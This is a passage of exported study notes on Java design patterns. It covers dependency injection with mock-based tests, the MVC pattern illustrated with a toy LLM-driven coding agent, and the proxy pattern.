log.clear();</code></pre></details></li></ul><ul id="e033d39a-5cc1-4af0-b718-4968ae518f92" class="toggle"><li><details><summary>Dependency Injection</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="03869083-e144-493d-a47e-8de1e9b5be30"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">dependencies are injected/provided to the class from an external source instead of the class managing itself<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e08d3c6d-df46-41fb-8e82-09002b8de824" class="code"><code class="language-Java">//tight coupling
interface Charly{
		default WMap read(String fileName){
				WMap res = new BobMap();
				... 
				return res;
		}
		
		default Entity stringToEntity(String e){
			 switch (e){
					 case &quot;Tree&quot;: return new BobTree();
					 case &quot;Rock&quot;: return new BobRock();
					 default: throw new Error(&quot;invalid &quot;+e);
			}
		}
}

//loose coupling with Dependency Injection
interface Charly{
		Supplier&lt;WMap&gt; map();//Could be BobMap map() but also a mock
		Map&lt;String,Supplier&lt;Entity&gt;&gt; es();
				
		default WMap read(String fileName){
				WMap res = map().get();//abstract factory pattern!
				...//code without &#x27;new&#x27; stays the same
				for (var e:data){
						res.set(xi, yi, es().get(e).get()); //abstract factory pattern!
						yi += 1;
						if (yi == WMap.maxY)
							 yi = 0; xi += 1;
				}
				return res;
		}
}</code></pre><ul id="3f12e685-88fe-4e30-8fe0-b8dcbdd1a345" class="bulleted-list"><li style="list-style-type:disc">Writing code in a team (with independently testable components) is essentially dependency injection</li></ul><ul id="0a379937-9e7d-41ec-9298-ddeeaeb95940" class="bulleted-list"><li style="list-style-type:disc">mocks + factory = kinda Dependency Injection</li></ul></div></figure><h3 id="9cfe8871-5063-49f7-8b0f-665d2ea7500d" class="">Independently Testable Components Video Game Example</h3><p id="5258da6b-3db0-4438-a10c-a8268c010a2d" class="">bob, alice and charly wants to make a game, bob works on BobTree, BobRock and BobMap while alice and charly work on WMap saving and reading</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="cf2e5022-840f-4c46-a562-3db6a0843c4a" class="code"><code class="language-Java">//Common code
interface WMap{//WMap == world map
 Entity get(int x, int y);
 void set(int x, int y, Entity e);
 static final int maxX= 5;
 static final int maxY= 5;
}
interface Entity{
 String name();
 int weight();//and many more
}

//Bob Code
class BobMap implements WMap{//Unfinished
 public Entity get(int x, int y){ throw new Error(&quot;Todo&quot;); }
 public void set(int x, int y,Entity e){ throw new Error(&quot;Todo&quot;); }
}
class BobTree implements Entity{
 public String name(){ return &quot;Tree&quot;; }
 public int weight(){ return 100; }//and many more
}
class BobRock implements Entity{
 public String name(){ return &quot;Rock&quot;; }
 public int weight(){ return 500; }//and many more
}</code></pre><p id="58cfe679-e8d0-4be2-bbc9-47f6e8598f65" class="">how can alice test their code without bob’s code if it depends on it?</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6d073499-41d1-424b-96e0-318a5452346a" class="code"><code class="language-Java">//Alice code
interface Alice{
		default void save(WMap map, String fileName){
				String res= &quot;&quot;;
				for (int xi= 0; xi &lt; WMap.maxX; xi++){
						for (int yi= 0; yi &lt; WMap.maxY; yi++){
								res += map.get(xi, yi).name() + &quot;,&quot;;
						}
						res += &quot;\n&quot;;
				}
				writeOnFile(fileName, res);
		}
		default void writeOnFile(String fileName, String content){
				try { Files.writeString(Path.of(fileName), content); }
				catch(IOException e){ throw new Error(e); }
		}
}
//Can we test this code without using Bob code?</code></pre><p id="e168f420-9a07-40ba-a9d6-bf31c9dc2d80" class="">we can use mocks to implement parts of bobs code which is enough to test!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7cdbc3c7-29f0-4fa3-9dd7-3d3bcccb487d" class="code"><code class="language-Java">import static org.junit.jupiter.api.Assertions.*; ...
record MockEntity(String name) implements Entity{
 public int weight(){ throw new Error(); }
} //same for all methods not related to save/load
record MockMap(List&lt;String&gt; log, Map&lt;String,String&gt; data) implements WMap {
 public void set(int x, int y, Entity e){ throw new Error(); }
 public Entity get(int x, int y){
 log.add(&quot;Get &quot; + x + &quot;,&quot; + y);
 String res= data.getOrDefault(x + &quot;,&quot; + y,&quot;Out&quot;);
 return new MockEntity(res);
 }
}
record AliceTestSave(List&lt;String&gt; log) implements Alice{
 public void writeOnFile(String fileName, String content){
 log.add(fileName); log.add(content);
 }
 public static void check(Map&lt;String,String&gt; data, String logRes){
 var log= new ArrayList&lt;String&gt;();
 new AliceTestSave(log).save(new MockMap(log,data), &quot;dummy.txt&quot;);
 assertEquals(logRes, log.stream().collect(Collectors.joining(&quot;\n&quot;)));
 }
}

@Test void test() {
 AliceTestSave.check(
 Map.of(&quot;1,2&quot;,&quot;Tree&quot;, &quot;3,4&quot;,&quot;Rock&quot;),&quot;&quot;&quot;
 Get 0,0
 Get 0,1
 Get 0,2
 ...
 Get 4,3
 Get 4,4
 dummy.txt
 Out,Out,Out,Out,Out,
 Out,Out,Tree,Out,Out,
 Out,Out,Out,Out,Out,
 Out,Out,Out,Out,Rock,
 Out,Out,Out,Out,Out,
 &quot;&quot;&quot;);}
 //not testing if the code is saving a file correctly
 //but instead testing if my code would save a file correctly in produciton</code></pre><p id="5ead65b5-f95a-4af8-bebd-169c636a637f" class="">well how can charly test their code? currently it doesn’t even compile without bob code</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4388c411-78df-4f0b-91bf-bc2b71751319" class="code"><code class="language-Java">//First attempt at Charly code
interface Charly0{
 default WMap read(String fileName){
 WMap res= new BobMap();
 ...
 return res;
 }
 default Entity stringToEntity(String e){
 switch (e){
 case &quot;Tree&quot;: return new BobTree();
 case &quot;Rock&quot;: return new BobRock();
 default: throw new Error(&quot;invalid &quot;+e);
 }
 }
 default String readFile(String fileName){
 try { return Files.readString(Path.of(fileName)); }
 catch (IOException e){ throw new Error(e); }
 }
}
//Can we test this code without using Bob code? No, since we hardcoded
//new BobMap, new BobTree and new BobRock</code></pre><p id="c5ff2d8f-259d-4f69-9b2f-ce60082a0184" class="">instead of using new bobmap, new new bobtree, new bobrock, we can instead use the abstract factory pattern and use suppliers instead of directly calling new</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0130c520-c847-4938-90c9-1eb7543a1ca3" class="code"><code class="language-Java">//DEPENDENCY INJECTION
interface Charly{
 Supplier&lt;WMap&gt; map();//Could be BobMap map() but also a mock
Map&lt;String,Supplier&lt;Entity&gt;&gt; es();
 default WMap read(String fileName){
 WMap res= map().get();//abstract factory pattern!
 ... //code without &#x27;new&#x27; stays the same
 for (var e:data){
 res.set(xi, yi, es().get(e).get());//abstract factory pattern!
 yi += 1;
 if (yi == WMap.maxY){ yi = 0; xi += 1; }
 }
 return res;
 }
 default String readFile(String fileName){
 try { return Files.readString(Path.of(fileName)); }
 catch(IOException e){ throw new Error(e); }
 }
}
//Now we can test this code without using Bob code!
//The &#x27;new&#x27; keyword is an enemy of testable code!</code></pre><p id="ed5bdbdd-d1a4-4cb6-b93d-9e8db53a141b" class="">now that we’re using suppliers, we can put mock objects in the supplier to test the code without bob code</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74adc128-e533-49de-89fc-147eafb383aa" class="code"><code class="language-Java">import static org.junit.jupiter.api.Assertions.*; ..
record MockEntity(String name) implements Entity{
 public int weight(){ throw new Error(); }
} //same for all methods not related to save/load
record MockMap(List&lt;String&gt; log) implements WMap{
 public Entity get(int x, int y){ throw new Error(); }
 public void set(int x,int y, Entity e){ log.add(&quot;Set &quot;+x+&quot;,&quot;+y+&quot; &quot;+e.name());}
}
record CharlyTestLoad(
 List&lt;String&gt; log,
 Supplier&lt;WMap&gt; map,
 Map&lt;String,Supplier&lt;Entity&gt;&gt; es,
 String content
 ) implements Charly{
 public String readFile(String fileName){ log.add(fileName); return content; }
 public static void check(String content, String expected){
 ...
 }
}
..</code></pre><h3 id="3116881e-b953-4892-969b-3e431436f480" class="">Dependency injection frameworks</h3><ul id="696b8c3e-d46f-4d45-bc45-a1b0a5c18fed" class="bulleted-list"><li style="list-style-type:disc">do dependency injection but…</li></ul><ul id="5814a28f-7f59-4e06-8749-2bf4000d209a" class="bulleted-list"><li style="list-style-type:disc">don’t use dependency injection frameworks</li></ul><figure id="8aa41904-6063-406f-8236-2026b1f6f699" class="image"><a href="image.png"><img style="width:624px" src="image.png"/></a></figure></details></li></ul><ul id="791eab7a-2291-477c-90d8-4888da2df4ba" class="toggle"><li><details><summary>MVC Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="d5e6dce9-25d0-41f5-8236-34e3c88eb883"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="ede72ec3-209f-4d30-aabd-f3f6a6c59b09" class="">architecture that separates the program into a view (UI/front-end), controller (middleware) and model (data &amp; logic/backend)</p><figure id="4b2eb019-2d77-41a6-8397-58b456be0515" class="image"><a href="Untitled%206.png"><img style="width:562px" src="Untitled%206.png"/></a></figure><ul id="eb799b27-64a1-4f72-97ba-51397b43a30b" class="bulleted-list"><li style="list-style-type:disc">controller (and sometimes view) stores the model as a field</li></ul><ul id="0e8558db-bc2e-46b7-8b30-91b0b9adb4b7" class="bulleted-list"><li style="list-style-type:disc">model observers the view and view observers the controller</li></ul><ul id="2a9e1b96-5aaa-4821-9e5d-3814e76b1b72" class="bulleted-list"><li style="list-style-type:disc">MVC + proxy pattern is used in web design<ul id="a7914a61-7449-4fc0-b6b5-2d6e8f4961df" class="bulleted-list"><li style="list-style-type:circle">views and controllers are distributed to many users</li></ul><ul id="154c40ee-89e1-40d1-8457-24115d703b44" class="bulleted-list"><li style="list-style-type:circle">a proxy/mock model is given to the user which forwards calls to the actual target model running on a server</li></ul></li></ul><ul id="3c89b810-e032-4dd3-b4be-9a0898b7ed60" class="bulleted-list"><li style="list-style-type:disc">MVC can be used without GUI’s when components interact asynchronously (especially if they have to iterate over and over again)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ff718a9-7c69-4f2e-bc20-c926167b96c3" class="code"><code class="language-Java">//mvc types
//view contains the LLM
record View(LLM llm, Consumer&lt;View&gt; evenListener, List&lt;String&gt; llmResults){..
 void updateFromModel(ReadModel m){..} //view stores model as a parameter
}

//two types of models
//read only model to read data
interface ReadModel{..}

//model with logic to mutate data
interface Model extends ReadModel{..
 void setEventListener(Runnable e);//model observers the view with a runnable
 void endPhase();
}

record Controller(Model m){.. //controller sees model 
 void parseAllActions(String input){..}
}

//client code
public static void main(String[] args) {
 Model model= makeModel();
 Controller c= new Controller(model); //controller stores the model
 View view= new View(
		 new LLM(), 
		 v-&gt;c.parseAllActions(v.llmResults().getLast()), //view observers the controller
		 new ArrayList&lt;&gt;()
 );
 model.setEventListener(()-&gt;view.updateFromModel(model)); //model observers the view
 model.endPhase();
}</code></pre></div></figure><h3 id="6f96b0cb-58b4-438e-8f91-485d2aac98cb" class="">Controller</h3><p id="d0de18f2-823c-475c-8698-c56a044548c2" class=""><mark class="highlight-yellow">converts user events into model actions</mark> by notifying the model</p><ul id="ad73d64b-df72-4f64-beab-6fd5ac8ff9b0" class="bulleted-list"><li style="list-style-type:disc">handle’s user input, intenerates it and translate it into actions for the model or view</li></ul><ul id="1f34f6e1-969d-48bd-ac1d-21116b793375" class="bulleted-list"><li style="list-style-type:disc">stores the model as a field for direct access</li></ul><ul id="b323c242-0efb-4fc2-a384-a323b6f3d9b4" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">empty when GUI directly maps to the model</mark></li></ul><ul id="60e6f5c5-e2c7-4e0c-ba57-082f5647c12b" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">complex when GUI is an first person shooter!</mark></li></ul><h3 id="fc4ade5c-3d32-4955-b3a0-c17844723633" class="">View</h3><p id="8a60b43f-8fd3-4043-bf05-7d18faeedb29" class=""><mark class="highlight-yellow">queries model to draw a GUI</mark> to <mark class="highlight-yellow">show a slice of the “simulated reality”</mark> that you encode within your program</p><ul id="3a98b6bc-0353-4623-8d2c-74832a7fff03" class="bulleted-list"><li style="list-style-type:disc">sometimes stores the model as a field for direct access</li></ul><ul id="544d1618-26c5-4000-9ace-acd10b5e0201" class="bulleted-list"><li style="list-style-type:disc">indirectly accesses the controller via an observer</li></ul><ul id="d6f302c0-b00f-4722-a7ba-9c8d5ac232c4" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">renders mesh, shaders, particle effects and lighting for video games</mark></li></ul><ul id="1bb909aa-3942-400c-b817-8bae29c0bc48" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">complex code for customizable widgets in an IDE</mark></li></ul><ul id="d24ab538-d624-4e74-9b56-408d37946d59" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">simple, autogenerated code for directly representing the model</mark></li></ul><h3 id="24fba917-7c24-4938-b568-031ec60e0e86" class="">Model</h3><p id="986e456d-3db4-4b3a-9e91-11cf036ad344" class=""><mark class="highlight-yellow">represents the “simulated reality” </mark>that you encode within your program and <mark class="highlight-yellow">notifies the view</mark> on relevant changes</p><ul id="c0a35f98-35e7-41a1-a432-5099409b9e37" class="bulleted-list"><li style="list-style-type:disc">stores data (database or store) and encapsulates methods for updating data, enforce rules, or calculate derived values</li></ul><ul id="1a4f95b4-638f-4ef5-bea6-f69ded5a1033" class="bulleted-list"><li style="list-style-type:disc">indirectly accesses the view via an observer</li></ul><ul id="1d67bf38-3d4e-4387-b96e-2acc98496dcf" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">nearly empty when representing static data, changed only manually by the user</mark></li></ul><ul id="9277c1bc-d30f-439d-84e9-265a3201b047" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-gray">a lot of stuff for complex games with intrinsic ideas of time passing and entities in your world interacting</mark></li></ul><h1 id="ba8dbc96-6f34-4477-848e-50c57fbe8f84" class="">Example (Overkill AGI)</h1><h3 id="72ecb888-dbfe-40a8-b061-ad2db7e69255" class="">MVC types</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b034a8ac-5513-4065-8b46-29b98eb7091d" class="code"><code class="language-Java">class LLM{..}

//The view contains the LLM
record View(LLM llm, Consumer&lt;View&gt; evenListener, List&lt;String&gt; llmResults){..
 void updateFromModel(ReadModel m){..} //The view only sees ReadModel
}

//Two kinds of model: The ReadModel only offers method to read data. 
interface ReadModel{..}

//The Model also offers method mutating the model state
interface Model extends ReadModel{..
 void setEventListener(Runnable e);
 void endPhase();
}

//The controller contains the Model
record Controller(Model m){.. //The controller sees Model
 void parseAllActions(String input){..}
}</code></pre><h3 id="66982c78-4684-415b-82b9-16e2ed49c16c" class="">Client code</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b679862b-c3f8-4e86-8301-846e7c19f1ad" class="code"><code class="language-Java">Model model= makeModel(); //factory pattern
Controller c= new Controller(model); //controller directly contains model
View view= new View(new LLM(),
//view contains controller via an observer
 v-&gt;c.parseAllActions(v.llmResults().getLast()), 
 new ArrayList&lt;&gt;());
//model contains view via a controller
model.setEventListener(()-&gt;view.updateFromModel(model));
model.endPhase();</code></pre><h3 id="79541e32-32e4-4ca6-ac65-05a2b1077e35" class="">Model methods</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0a54b3dc-31fe-43ef-aa62-b33b44a873ef" class="code"><code class="language-Java">interface ReadModel{ //model methods reading state
 String summaryLastActions();
 List&lt;Objective&gt; objectives();
 Objective currentObjective();
 List&lt;Map&lt;CodeFile,String&gt;&gt; buildResultsHistory();
 List&lt;Map&lt;TestFile,String&gt;&gt; testResultsHistory();
}
interface Model extends ReadModel{ //model methods updating state
 void setCurrentObjective(Objective o);
 void removeObjective(Objective o);
 void addObjective(Objective o);
 void updateObjective(Objective o);
 void removeCodeFile(CodeFile file);
 void addCodeFile(CodeFile file);
 void updateCodeFile(CodeFile file);
 void removeTestFile(TestFile file);
 void addTestFile(TestFile file);
 void updateTestFile(TestFile file);
 void buildCode();
 void runTests();
 void endPhase();
 void setEventListener(Runnable e); //subject of Observer pattern
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b663a4ea-a1b6-4a8e-b6df-befbbb9d47ac" class="code"><code class="language-Java">record Objective(
 String name,
 String description,
 List&lt;String&gt; progress,
 List&lt;Objective&gt; usefulFor){}
record CodeFile(
 String fileName,
 String content,
 List&lt;String&gt; todos){}
record TestFile(
 String fileName,
 String content,
 Map&lt;Timestamp,List&lt;String&gt;&gt; results){}</code></pre><h3 id="04c9baf4-843c-4ad8-b852-3c6dd9a34dd5" class="">LLM Implementation</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a73fd66d-7ddf-49b3-96b2-17dcb4b194d9" class="code"><code class="language-Java">class LLM{//Mock implementation
	 private final static ScheduledExecutorService scheduler
	 = Executors.newScheduledThreadPool(1);
	 void submit(String prePrompt, String prompt){
	 //This method should do the API calls to the remote LLM
	 String dummy= ...;
	 scheduler.schedule(()-&gt;listener.accept(dummy),1, TimeUnit.SECONDS);
	 }
	 //This below is code as it should be (following the observer pattern)
	 void setEventListener(Consumer&lt;String&gt; c){listener= c;}
	 Consumer&lt;String&gt; listener= s-&gt;{}; //Null object pattern
}</code></pre><h3 id="aaddbf14-877b-425b-9dce-cdbee1dc2349" class="">View Implementation</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4adebd11-cd32-4173-879c-4aa3b6ccb429" class="code"><code class="language-Java">//Observer pattern by field instead of Mock implementation
record View(LLM llm, Consumer&lt;View&gt; evenListener, List&lt;String&gt; llmResults){
 View{
 llm.setEventListener(res-&gt;{
 llmResults.add(res);
 evenListener.accept(this);//LLM can notify the View when webAPI done
 });
 }
 String prePrompt(){ /*..*/ };
 String prompt(ReadModel m){
 return m.summaryLastActions()//Example code, should do more stuff
 + m.currentObjective()
 + m.objectives().stream()
 .map(o-&gt;o.name()).collect(Collectors.joining(&quot;\n&quot;));
 };
 void updateFromModel(ReadModel m){
 llm.submit(prePrompt(),prompt(m));
 }
}</code></pre><h3 id="f32c5557-4a8d-4b76-822c-8b5a1beb1bbb" class="">Controller Implementation</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0f58c82a-b36e-457d-9372-862d4b7f6765" class="code"><code class="language-Java">record Controller(Model m){
 static final String start= &quot;[ActionStart]&quot;;
 static final String end= &quot;[ActionEnd]&quot;;
 void parseAllActions(String input){
 int startIndex= 0;//Parse input into actions. In a real application this
 while (true){ //would be much more code, with fall backs and heuristics
 startIndex = input.indexOf(start, startIndex);
 if (startIndex == -1){ break; }
 int endIndex= input.indexOf(end, startIndex);
 if (endIndex == -1){ break; }
 String action = input.substring(startIndex + start.length(), endIndex);
 startIndex = endIndex + end.length();
 parseSingleAction(action.trim());
 }
 m.endPhase();
 }
 void parseSingleAction(String input){
 /*..*///Example code
 m.addObjective(new Objective(&quot;Refactor classes into records&quot;,&quot;..&quot;,..,..));
 }
}</code></pre></details></li></ul><ul id="01973476-7e81-436e-b856-25c8b5644dcb" class="toggle"><li><details><summary>Proxy Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="d6553b7f-bdee-4f60-8b28-65eaa194a008"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="016a7371-b437-4bd0-822e-4c68dd759700" class="">an object that <mark class="highlight-brown_background">forwards operation calls to the target</mark> or <mark class="highlight-yellow_background">offers a get() method returning the target</mark></p><figure id="50ed3fa4-d2bc-4ac8-b9ce-a79661719246" class="image"><a href="Untitled%207.png"><img style="width:494px" src="Untitled%207.png"/></a></figure><ul id="5bdbd7ac-ba18-4a42-a53a-77680ccb43ee" class="bulleted-list"><li style="list-style-type:disc">Optional&lt;T&gt;: the Target may or may not be present.</li></ul><ul id="3607aa06-b9bd-4255-ada1-123b2945eb5a" class="bulleted-list"><li style="list-style-type:disc">Future&lt;T&gt;: the Target may not be present yet.</li></ul><ul id="2169ab6e-4531-4c09-a1a2-eb42b490e753" class="bulleted-list"><li style="list-style-type:disc">Remote (java.rmi): The target may be on another machine, and is accessed by remote method invocation.</li></ul></div></figure></details></li></ul><ul id="e7fdc60d-f6b3-4e30-bd55-f708d22aa99d" class="toggle"><li><details><summary>Null Object Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="31250925-dfb6-4d2d-ba3d-67660e701c23"><div style="font-size:1.5em"><span class="icon">💡</span></div><div 